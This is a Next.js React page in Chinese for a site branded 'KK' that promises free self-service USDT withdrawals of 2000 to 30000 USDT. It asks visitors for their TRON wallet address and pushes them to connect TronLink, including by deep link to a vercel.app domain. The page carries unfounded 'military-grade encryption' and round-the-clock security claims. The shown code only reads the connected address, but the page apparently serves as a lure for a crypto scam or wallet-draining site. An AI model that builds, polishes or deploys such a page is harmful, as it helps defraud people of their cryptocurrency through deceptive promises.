"use client";

import { useState } from "react";


export default function Home(){


const [amount,setAmount] = useState("2000");

const [inputAddress,setInputAddress] = useState("");

const [msg,setMsg] = useState("");

const [showWalletModal,setShowWalletModal] = useState(false);





// =========================
// 打开 TronLink
// =========================

function openWallet(){


const isMobile =
/Android|iPhone|iPad|iPod/i.test(
navigator.userAgent
);



if(isMobile){


window.location.href =
"tronlink://dapp?url=https://kk-usdt-withdraw.vercel.app";



}else{


if(
(window as any).tronWeb
){


connectWallet();


}else{


setMsg(
"请安装 TronLink Chrome 插件"
);


}


}



}







// =========================
// PC插件连接
// =========================


async function connectWallet(){


try{


const tronWeb =
(window as any).tronWeb;



if(!tronWeb){


setMsg(
"未检测到TronLink"
);


return;


}



if(
tronWeb.request
){


await tronWeb.request({

method:
"tron_requestAccounts"

});


}





const address =
tronWeb.defaultAddress.base58;



if(address){


setMsg(
"钱包连接成功："+address
);


}else{


setMsg(
"请授权连接钱包"
);


}



}catch(e){


console.log(e);


setMsg(
"钱包连接失败"
);


}



}






// =========================
// 点击绑定
// =========================


async function bindWallet(){


try{


if(!inputAddress.trim()){


setMsg(
"请输入您的TRON钱包地址"
);


return;


}






const tronReg =
/^T[1-9A-HJ-NP-Za-km-z]{33}$/;




if(!tronReg.test(inputAddress)){


setMsg(
"请输入正确的TRON钱包地址"
);


return;


}





const tronWeb =
(window as any).tronWeb;





if(!tronWeb || 
!tronWeb.defaultAddress.base58
){


setShowWalletModal(true);


return;


}




const walletAddress =
tronWeb.defaultAddress.base58;



setMsg(
"钱包连接成功："+walletAddress
);





}catch(e){


console.log(e);


setMsg(
"连接失败"
);


}



}
return (


<main className="min-h-screen bg-[#030817] text-white px-5 py-6">





{/* Header */}


<div className="flex justify-between items-center">



<div className="flex items-center gap-3">


<div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">

KK

</div>




<div>


<div className="font-bold text-lg">

自助领取USDT

</div>


<div className="text-xs text-gray-400">

Secure Web3 Service

</div>


</div>


</div>





<div className="rounded-full border border-white/10 px-4 py-2 text-sm">

🟢 TRON Network

</div>



</div>








{/* 主标题 */}



<div className="text-center mt-20">



<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">

⚡ 快速 · 安全 · 专业

</div>




<h1 className="text-4xl font-bold mt-8">

提取地址绑定

</h1>





<p className="text-gray-400 mt-5 leading-8">

绑定您的TRON钱包地址

<br/>

用于USDT提取

</p>



</div>









{/* 金额选择 */}



<div className="mt-12">


<h2 className="font-bold text-lg mb-5">

选择提取金额

</h2>







<label

className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
amount==="2000"

?

"border-cyan-400 bg-cyan-400/10"

:

"border-white/10 bg-white/5"

}`}


>


<input

type="radio"

checked={amount==="2000"}

onChange={()=>setAmount("2000")}

className="hidden"

/>




<div className="text-cyan-300 text-sm">

⭐ 新用户测试专用

</div>





<div className="text-4xl font-bold mt-3">

2000

<span className="text-xl text-cyan-300 ml-2">

USDT

</span>


</div>



</label>









<div className="grid grid-cols-2 gap-4">


{


["10000","20000","30000"].map(item=>(



<label

key={item}


className={`rounded-2xl border py-5 text-center cursor-pointer ${
amount===item

?

"border-cyan-400 bg-cyan-400/20 text-cyan-300"

:

"border-white/10 bg-white/5"

}

${item==="30000"?"col-span-2":""}

`}


>


<input


type="radio"


checked={amount===item}


onChange={()=>setAmount(item)}


className="hidden"



/>



{item} USDT



</label>



))


}



</div>






<div className="text-center mt-5 text-sm text-gray-400">


当前选择：

<span className="text-cyan-300 ml-2">

{amount} USDT

</span>



</div>



</div>









{/* 地址输入 */}



<div className="mt-12">



<h2 className="font-bold text-lg mb-5">

输入接收地址

</h2>







<div className="flex items-center gap-4 bg-white/5 border border-white/10 rounded-3xl p-5">


<div className="w-12 h-12 rounded-xl bg-cyan-400/20 flex items-center justify-center text-cyan-300 font-bold">

T

</div>




<input


value={inputAddress}


onChange={(e)=>setInputAddress(e.target.value)}


placeholder="请输入您的TRON钱包地址"


className="flex-1 bg-transparent outline-none placeholder:text-gray-600"



/>



</div>







<button


onClick={bindWallet}


className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"



>


立即绑定


</button>




{
msg &&


<div className="text-center text-cyan-300 mt-4 text-sm">


{msg}


</div>


}



</div>
{/* 安全说明 */}


<div className="mt-12 space-y-4">


<div className="bg-white/5 border border-white/10 rounded-2xl p-4">

🛡️ 军级加密技术，确保地址绑定安全

</div>



<div className="bg-white/5 border border-white/10 rounded-2xl p-4">

⚡ 毫秒级处理速度，及时完成绑定

</div>



<div className="bg-white/5 border border-white/10 rounded-2xl p-4">

🔰 专业风控团队，24小时安全保障

</div>



</div>








<footer className="text-center mt-16 pb-10 text-gray-500">


<div className="text-2xl text-cyan-300 font-bold">

KK

</div>



Secure Web3 Infrastructure



</footer>













{/* TronLink连接弹窗 */}



{

showWalletModal &&



<div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">



<div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">







<img


src="/tronlink-global.png"


className="w-24 h-24 mx-auto rounded-2xl"



/>







<h2 className="text-2xl font-bold mt-6">


连接TRON钱包


</h2>







<p className="text-gray-400 mt-4 leading-7">


连接您的TronLink钱包


<br/>


安全访问DApp


</p>







<button



onClick={openWallet}



className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"



>


连接 TronLink 钱包



</button>







<button


onClick={()=>setShowWalletModal(false)}



className="mt-5 text-gray-400"



>


取消



</button>






</div>



</div>



}





</main>


);


}
